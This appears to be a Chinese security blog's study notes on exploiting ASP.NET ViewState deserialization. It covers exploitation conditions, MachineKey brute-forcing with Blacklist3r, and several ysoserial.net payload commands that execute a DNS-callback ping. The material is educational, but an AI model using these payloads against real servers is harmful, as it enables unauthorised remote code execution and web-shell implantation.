---
layout: post
title: "【网络安全】ASP.NET ViewState反序列化漏洞学习"
subtitle: "This is a subtitle"
date: 2024-08-03
author: "3thernet"
header-img: "img/bg-touhou-1.jpg"
tags: []
---

最近连续参加的几次攻防都有见到 ViewState 反序列化漏洞 getshell 的身影，算是红队基本功，简单做下笔记。

相关工具：

1. [ysoserial](https://github.com/pwntester/ysoserial.net)

2. [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)

## 0x01 概述

ViewState用于在请求之间保持Web控件和页面的状态，防止服务器返回错误导致状态被清空。数据会被序列化成Base64字符串并嵌入页面的隐藏字段（通常是`__VIEWSTATE`）。

漏洞成因在于ASP.NET使用`LosFomatter`序列化 ViewState，并使用`ObjectStateFormatter`反序列化 ViewState。而 ViewState 又完全由客户端提交，尽管过程中可以进行**加密**和**签名**，但一旦相关的 Machinekey（decryption, validation相关信息）泄露，就会触发 ObjectStateFormatter 的反序列化漏洞。

MachineKey 通常显示配置在`web.config`文件中。如果没有显式配置，ASP.NET会自动生成一个密钥，但在应用程序重启时可能会发生变化，导致无法解密先前加密的数据。(?)

示例：

```
<machineKey 
validationKey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" 
decryptionKey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" 
validation="SHA1" 
decryption="AES"  />
```

## 0x02 利用条件

1. ASP.NET<4.5.x，未开启MAC验证

2. ASP.NET<4.5.x，开启MAC验证，ysoserial 工具需要知道 validation 算法，validationkey 来生成 ViewState 的 payload。即使`ViewStateEncryptionMode`已设置为`Always`，ASP.NET 仅会检查请求中是否存在`__VIEWSTATEENCRYPTED`参数，如果删除此参数并发送未加密的有效负载，它仍将被处理

3. ASP.NET>=4.5.x，开启MAC验证，和上一条的区别在于 ysoserial 工具除了需要知道 validation 算法，validationkey，还需要知道 decryption算法和 decryptionkey 来生成 ViewState 的 payload

### 2.1 未开启MAC验证

未开启MAC验证的情况不太常见，ASP.NET4.5.2版本以后强制开启 MAC 验证，手动关闭需要两步：

1、修改注册表 AspNetEnforceViewStateMac 为 0

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{version}`

2、修改 web.config 中的 enableViewStateMac 选项为 false

判断是否开启MAC验证：发送`__VIEWSTATE=AAAA`（简单的base64），如果目标页面回显错误，表示MAC验证已被禁用，否则不会显示错误页面（也可能显示具体MAC校验错误信息）

这种情况直接上 payload：

```powershell
.\ysoserial.exe
-o base64
-g TypeConfuseDelegate
-f LosFormatter
-c "ping 123456.dnslog.cn"
# 指定-f LosFormatter或者-p ViewState
```

### 2.2 ASP.NET < 4.5.x，开启MAC验证

ASP.NET 常见的签名算法为 HMACSha256（也可能是SHA1），计算出的签名会附加在 ViewState 数据最后。MacKeyModifier 是签名算法的 Salt，由 ClientId 和 ViewStateUserKey 两部分拼接而成，默认情况下，ViewStateUserKey 为空（也很少会设置），ClientId 为当前页面虚拟目录路径(apppath)和类型名称(path)的 HashCode 之和，并以 Hex 形式存放于名为`__VIEWSTATEGENERATOR`的隐藏表单中。换言之，如果表单中没有该选项，就需要黑盒爆破获得apppath。path可以通过请求路径得出：蒋其中的`.`和`/`替换为为`_`，如`a/b/c.aspx`的最终类型名为`a_b_c_aspx`。

```powershell
.\ysoserial.exe
-o base64
-p ViewState
-g TextFormattingRunproperties
-c "ping 123456.dnslog.cn"
--path="/site/test.aspx"
--apppath="/"
--validationalg="SHA1"
--validationkey="BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
```

### 2.3 ASP.NET >= 4.5.x，开启MAC验证

高版本的ASP.NET能否强行关闭MAC验证，只启用加密？（未做实验）

```powershell
.\ysoserial.exe
-o base64
-p ViewState
-g TextFormattingRunproperties
-c "ping 123456.dnslog.cn"
--generator=CA0B0334
--validationalg="SHA1"
--validationkey="BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
--decryptionalg="3DES"
--decryptionkey="CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
```

### 2.4 MachineKey

开启 MAC 验证后必须知道 Machinekey 才能打，一般是通过任意文件读取或者XXE漏洞获得，也可以使用 Blacklist3r 工具爆破：

```powershell
.\ASPNetWrapper.exe
--keypath MachineKeys.txt
--encrypteddata={__VIEWSTATE}
--modifier={__VIEWSTATEGENERATOR}
```

### 2.5 其他

借助 yso 的 islegacy 和 isdebug 开关，可以尝试猜测 path 和 apppath 的值

如果服务器设置了 ViewStateUserKey，则需要在添加`--viewstateuserkey`选项

## 0x03 攻击链

TypeConfusedDelegate 链？

ActivitySurrogateSelectorFromFile 链?

## 0x04 ViewState CVE

- CVE-2020-0688

- CVE-2020-16592

## 0x05 参考

- [.NET 分享ViewState反序列化漏洞个人总结 (qq.com)](https://mp.weixin.qq.com/s/7mtTDKQ3eJet3rxLKZyBNw)

- [深入 .NET ViewState 反序列化及其利用 (qq.com)](https://mp.weixin.qq.com/s/RlY5HL_ak4G8EdcXyevWDg)

- [通过 ViewState 利用 ASP.NET 中的反序列化 |Soroush Dalili （@irsdl） 博客](https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

- [玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門 | DEVCORE 戴夫寇爾](https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/)

- [ViewState反序列化 - zpchcbd - 博客园 (cnblogs.com)](https://www.cnblogs.com/zpchcbd/p/15112047.html)

- [TypeConfusedDelegate以及魔改yso - Gr3yy's Blog (gr3yyy123.github.io)](https://gr3yyy123.github.io/2022/05/28/TypeConfusedDelegate%E4%BB%A5%E5%8F%8A%E9%AD%94%E6%94%B9yso/)

- [.Net ViewState反序列化实现无文件哥斯拉内存马 – Whwlsfb's Tech Blog (wanghw.cn)](https://blog.wanghw.cn/security/dotnet-viewstate-no-file-godzilla-memshell.html)

- [利用ViewState在ASP.NET中实现反序列化RCE - 技术转载 安全矩阵 (smatrix.org)](http://www.smatrix.org/forum/forum.php?mod=viewthread&tid=331)

- [利用.NET 反序列化做权限维持 | MYZXCG](https://myzxcg.com/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/)

- [CVE-2020-0688的武器化与.net反序列化漏洞那些事-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/199921#h3-9)

- [Zero Day Initiative — CVE-2020-0688: Remote Code Execution on Microsoft Exchange Server Through Fixed Cryptographic Keys](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
